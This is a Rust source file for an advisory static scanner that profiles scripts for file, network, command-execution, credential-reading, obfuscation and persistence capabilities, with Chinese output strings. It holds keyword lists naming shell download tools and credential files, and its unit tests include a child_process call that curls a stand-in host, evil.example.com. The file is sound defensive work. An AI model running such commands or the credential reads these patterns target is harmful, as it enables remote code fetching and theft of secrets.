use regex::Regex;
use serde::Serialize;
use std::path::{Path, PathBuf};

const MAX_SOURCE_FILES: usize = 128;
const MAX_SOURCE_BYTES: usize = 2 * 1024 * 1024;

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Finding {
    pub capability: String,
    pub detail: String,
    pub severity: String,
}

/// Advisory source inspection. This is deliberately named a profile rather
/// than a malware verdict: dynamic/obfuscated code and remote payloads remain
/// opaque, and Mosaic does not enforce these findings at runtime.
#[derive(Debug, Clone, Serialize, Default)]
#[serde(rename_all = "camelCase")]
pub struct CapabilityProfile {
    pub reads_files: bool,
    pub writes_files: bool,
    pub deletes_files: bool,
    pub network: bool,
    pub exec_command: bool,
    pub reads_credentials: bool,
    pub dynamic_exec: bool,
    pub autostart: bool,
    pub hosts: Vec<String>,
    pub findings: Vec<Finding>,
    pub risk: String,
    pub summary: String,
    pub scope: String,
    pub files_scanned: usize,
    pub truncated: bool,
}

fn has_any(text: &str, needles: &[&str]) -> bool {
    needles.iter().any(|needle| text.contains(needle))
}

pub fn scan(source: &str) -> CapabilityProfile {
    let mut profile = analyze(source);
    profile.scope = format!("已检查粘贴文本（{} 个字符）", source.chars().count());
    profile
}

fn analyze(source: &str) -> CapabilityProfile {
    let text = source.to_lowercase();
    let mut profile = CapabilityProfile::default();

    if has_any(
        &text,
        &[
            "readfile",
            "read_to_string",
            "fs.read",
            "std::fs::read",
            "get-content",
            "open(",
            "file.read",
            "readalltext",
        ],
    ) {
        profile.reads_files = true;
        profile.findings.push(Finding {
            capability: "读文件".into(),
            detail: "源码包含本地文件读取操作".into(),
            severity: "info".into(),
        });
    }
    if has_any(
        &text,
        &[
            "writefile",
            "write_all",
            "fs.write",
            "std::fs::write",
            "set-content",
            "out-file",
            "writealltext",
            "file.write",
            ">>",
        ],
    ) {
        profile.writes_files = true;
        profile.findings.push(Finding {
            capability: "写文件".into(),
            detail: "源码包含本地文件写入操作".into(),
            severity: "low".into(),
        });
    }
    if has_any(
        &text,
        &[
            "rmtree",
            "shutil.rmtree",
            "os.remove",
            "os.unlink",
            "fs.unlink",
            "unlinksync",
            "rmsync",
            "remove_file",
            "remove_dir_all",
            "remove-item",
            "rm -rf",
            "del /",
            "deletefile",
        ],
    ) {
        profile.deletes_files = true;
        profile.findings.push(Finding {
            capability: "删除文件".into(),
            detail: "源码包含删除文件或目录的操作".into(),
            severity: "medium".into(),
        });
    }
    if has_any(
        &text,
        &[
            "requests.",
            "urllib",
            "http://",
            "https://",
            "fetch(",
            "axios",
            "socket",
            "net.connect",
            "invoke-webrequest",
            "invoke-restmethod",
            "curl",
            "wget",
            "webclient",
            "httpclient",
        ],
    ) {
        profile.network = true;
        profile.findings.push(Finding {
            capability: "联网".into(),
            detail: "源码包含网络请求或套接字操作".into(),
            severity: "low".into(),
        });
    }
    if has_any(
        &text,
        &[
            "os.system",
            "subprocess",
            "child_process",
            "spawn(",
            "exec(",
            "popen",
            "start-process",
            "processbuilder",
            "system(",
            "cmd.exe",
            "powershell.exe",
        ],
    ) {
        profile.exec_command = true;
        profile.findings.push(Finding {
            capability: "执行命令".into(),
            detail: "源码会启动外部命令或子进程".into(),
            severity: "medium".into(),
        });
    }
    if has_any(
        &text,
        &[
            ".ssh",
            ".aws",
            "id_rsa",
            "os.environ",
            "process.env",
            "getenvironmentvariable",
            "keychain",
            "credential",
            "cookies",
            "login data",
            "local state",
        ],
    ) {
        profile.reads_credentials = true;
        profile.findings.push(Finding {
            capability: "读取敏感信息".into(),
            detail: "源码可能读取环境变量、凭据或浏览器登录数据".into(),
            severity: "high".into(),
        });
    }
    if has_any(
        &text,
        &[
            "eval(",
            "exec(",
            "new function",
            "invoke-expression",
            "iex ",
            "base64.b64decode",
            "frombase64string",
            "atob(",
            "-encodedcommand",
        ],
    ) {
        profile.dynamic_exec = true;
        profile.findings.push(Finding {
            capability: "动态执行 / 混淆".into(),
            detail: "源码可能动态拼接、解码后执行，静态检查无法看穿".into(),
            severity: "high".into(),
        });
    }
    if has_any(
        &text,
        &[
            "startup",
            "currentversion\\run",
            "launchagents",
            "crontab",
            "systemd",
            "schtasks",
            "register-scheduledtask",
            "登录启动",
        ],
    ) {
        profile.autostart = true;
        profile.findings.push(Finding {
            capability: "持久化 / 开机自启".into(),
            detail: "源码可能修改开机启动或计划任务".into(),
            severity: "high".into(),
        });
    }

    if let Ok(regex) = Regex::new(r#"https?://([a-zA-Z0-9\.\-_]+)"#) {
        for capture in regex.captures_iter(source) {
            if let Some(host) = capture.get(1) {
                let host = host.as_str().to_string();
                if !profile.hosts.contains(&host) {
                    profile.hosts.push(host);
                }
            }
        }
    }

    profile.risk = if profile.dynamic_exec || profile.autostart || profile.reads_credentials {
        "high".into()
    } else if (profile.network && (profile.writes_files || profile.exec_command))
        || profile.deletes_files
    {
        "medium".into()
    } else if profile.network || profile.exec_command || profile.writes_files {
        "low".into()
    } else {
        "minimal".into()
    };
    finish_summary(&mut profile);
    profile
}

fn finish_summary(profile: &mut CapabilityProfile) {
    let mut capabilities = Vec::new();
    if profile.reads_files {
        capabilities.push("读文件");
    }
    if profile.writes_files {
        capabilities.push("写文件");
    }
    if profile.deletes_files {
        capabilities.push("删除文件");
    }
    if profile.network {
        capabilities.push("联网");
    }
    if profile.exec_command {
        capabilities.push("执行命令");
    }
    if profile.reads_credentials {
        capabilities.push("读取敏感信息");
    }
    profile.summary = if profile.risk == "unknown" {
        "没有取得可完整检查的文本源码，无法判断代码行为；这不是安全证明。".into()
    } else if capabilities.is_empty() {
        "已检查范围内未匹配到已知危险模式；静态检查仍看不穿混淆、运行时生成代码和远程载荷，这不是安全证明。".into()
    } else {
        format!(
            "已检查源码可能会：{}。Mosaic 只提示这些能力，不会在运行时拦截。",
            capabilities.join("、")
        )
    };
}

fn inline_source(command: &str, args: &[String]) -> Option<String> {
    let command = Path::new(command)
        .file_name()
        .and_then(|value| value.to_str())
        .unwrap_or(command)
        .to_ascii_lowercase();
    let flags: &[&str] = if matches!(
        command.as_str(),
        "node" | "node.exe" | "python" | "python.exe" | "python3" | "py"
    ) {
        &["-e", "--eval", "-c"]
    } else if matches!(
        command.as_str(),
        "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe"
    ) {
        &["-command", "-c"]
    } else {
        &[]
    };
    args.windows(2)
        .find(|pair| flags.iter().any(|flag| pair[0].eq_ignore_ascii_case(flag)))
        .map(|pair| pair[1].clone())
}

fn resolve_candidate(value: &str, cwd: Option<&str>) -> Option<PathBuf> {
    let raw = PathBuf::from(value.trim_matches('"'));
    let candidate = if raw.is_absolute() {
        raw
    } else {
        Path::new(cwd?).join(raw)
    };
    candidate.is_file().then_some(candidate)
}

fn entry_file(command: &str, args: &[String], cwd: Option<&str>) -> Option<PathBuf> {
    if let Some(path) = resolve_candidate(command, cwd) {
        return Some(path);
    }
    for (index, arg) in args.iter().enumerate() {
        if arg.eq_ignore_ascii_case("-file") || arg.eq_ignore_ascii_case("/c") {
            if let Some(next) = args
                .get(index + 1)
                .and_then(|value| resolve_candidate(value, cwd))
            {
                return Some(next);
            }
        }
    }
    args.iter()
        .filter(|value| !value.starts_with('-') && !value.starts_with('/'))
        .find_map(|value| resolve_candidate(value, cwd))
}

fn source_extension(path: &Path) -> bool {
    matches!(
        path.extension()
            .and_then(|value| value.to_str())
            .unwrap_or_default()
            .to_ascii_lowercase()
            .as_str(),
        "ps1"
            | "py"
            | "js"
            | "mjs"
            | "cjs"
            | "ts"
            | "tsx"
            | "jsx"
            | "bat"
            | "cmd"
            | "rs"
            | "go"
            | "sh"
    )
}

fn ignored_dir(path: &Path) -> bool {
    matches!(
        path.file_name()
            .and_then(|value| value.to_str())
            .unwrap_or_default()
            .to_ascii_lowercase()
            .as_str(),
        ".git" | "node_modules" | "target" | "dist" | "build" | ".venv" | "venv" | "__pycache__"
    )
}

fn collect_sources(
    path: &Path,
    files: &mut Vec<PathBuf>,
    bytes: &mut usize,
    combined: &mut String,
    truncated: &mut bool,
) {
    if files.len() >= MAX_SOURCE_FILES || *bytes >= MAX_SOURCE_BYTES {
        *truncated = true;
        return;
    }
    if path.is_dir() {
        if ignored_dir(path) {
            return;
        }
        let mut entries = match std::fs::read_dir(path) {
            Ok(entries) => entries.filter_map(Result::ok).collect::<Vec<_>>(),
            Err(_) => return,
        };
        entries.sort_by_key(|entry| entry.file_name());
        for entry in entries {
            collect_sources(&entry.path(), files, bytes, combined, truncated);
            if *truncated {
                break;
            }
        }
        return;
    }
    if !source_extension(path) {
        return;
    }
    let data = match std::fs::read(path) {
        Ok(data) => data,
        Err(_) => return,
    };
    if data.len() > 1024 * 1024 || *bytes + data.len() > MAX_SOURCE_BYTES {
        *truncated = true;
        return;
    }
    let source = match String::from_utf8(data) {
        Ok(source) => source,
        Err(_) => return,
    };
    *bytes += source.len();
    files.push(path.to_path_buf());
    combined.push_str("\n/* file: ");
    combined.push_str(&path.to_string_lossy());
    combined.push_str(" */\n");
    combined.push_str(&source);
}

pub fn scan_task(command: &str, args: &[String], cwd: Option<&str>) -> CapabilityProfile {
    if let Some(source) = inline_source(command, args) {
        let mut profile = analyze(&source);
        profile.scope = format!("已检查命令行内嵌源码（{} 个字符）", source.chars().count());
        return profile;
    }

    let entry = entry_file(command, args, cwd);
    let root = cwd
        .map(PathBuf::from)
        .filter(|path| path.is_dir())
        .or_else(|| {
            entry
                .as_ref()
                .and_then(|path| path.parent().map(Path::to_path_buf))
        });
    let mut files = Vec::new();
    let mut bytes = 0usize;
    let mut combined = format!("{} {}", command, args.join(" "));
    let mut truncated = false;
    if let Some(root) = root {
        collect_sources(&root, &mut files, &mut bytes, &mut combined, &mut truncated);
    } else if let Some(entry) = entry {
        collect_sources(
            &entry,
            &mut files,
            &mut bytes,
            &mut combined,
            &mut truncated,
        );
    }

    if files.is_empty() {
        let mut profile = analyze(&combined);
        profile.risk = "unknown".into();
        profile.scope = "只检查了命令和参数；未找到可读取的文本源码".into();
        profile.findings.push(Finding {
            capability: "源码不可见".into(),
            detail: "入口可能是二进制、系统命令或不可读取文件".into(),
            severity: "high".into(),
        });
        finish_summary(&mut profile);
        return profile;
    }

    let mut profile = analyze(&combined);
    profile.files_scanned = files.len();
    profile.truncated = truncated;
    profile.scope = format!(
        "已读取 {} 个源码文件，共 {} KB",
        files.len(),
        (bytes + 1023) / 1024
    );
    if truncated {
        profile.risk = "unknown".into();
        profile.findings.push(Finding {
            capability: "检查不完整".into(),
            detail: format!("项目超过 {} 个文件或 2 MB 文本上限", MAX_SOURCE_FILES),
            severity: "high".into(),
        });
        finish_summary(&mut profile);
    }
    profile
}

#[cfg(test)]
mod tests {
    use super::{scan, scan_task};

    #[test]
    fn detects_network_exec_and_host() {
        let profile = scan("require('child_process').exec('curl https://evil.example.com/x')");
        assert!(profile.network);
        assert!(profile.exec_command);
        assert!(profile.hosts.iter().any(|host| host == "evil.example.com"));
    }

    #[test]
    fn dynamic_exec_is_high_risk() {
        let profile = scan("eval(atob('ZWNobyBoaQ=='))");
        assert!(profile.dynamic_exec);
        assert_eq!(profile.risk, "high");
    }

    #[test]
    fn benign_output_is_minimal() {
        let profile = scan("console.log(JSON.stringify({ ok: true }))");
        assert_eq!(profile.risk, "minimal");
        assert!(profile.findings.is_empty());
    }

    #[test]
    fn inline_node_source_is_actually_scanned() {
        let args = vec!["-e".into(), "fetch('https://example.com')".into()];
        let profile = scan_task("node", &args, None);
        assert!(profile.network);
        assert!(profile.scope.contains("内嵌源码"));
    }

    #[test]
    fn missing_or_binary_source_is_unknown() {
        let profile = scan_task("missing-tool.exe", &[], None);
        assert_eq!(profile.risk, "unknown");
        assert_eq!(profile.files_scanned, 0);
    }

    #[test]
    fn reads_actual_project_source_files() {
        let root = std::env::temp_dir().join(format!("mosaic-scan-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&root).unwrap();
        let entry = root.join("main.py");
        std::fs::write(
            &entry,
            "import requests\nrequests.get('https://api.example.com/data')\n",
        )
        .unwrap();
        let args = vec![entry.to_string_lossy().into_owned()];
        let profile = scan_task("python", &args, root.to_str());
        assert_eq!(profile.files_scanned, 1);
        assert!(profile.network);
        assert!(profile.hosts.iter().any(|host| host == "api.example.com"));
        let _ = std::fs::remove_dir_all(root);
    }
}
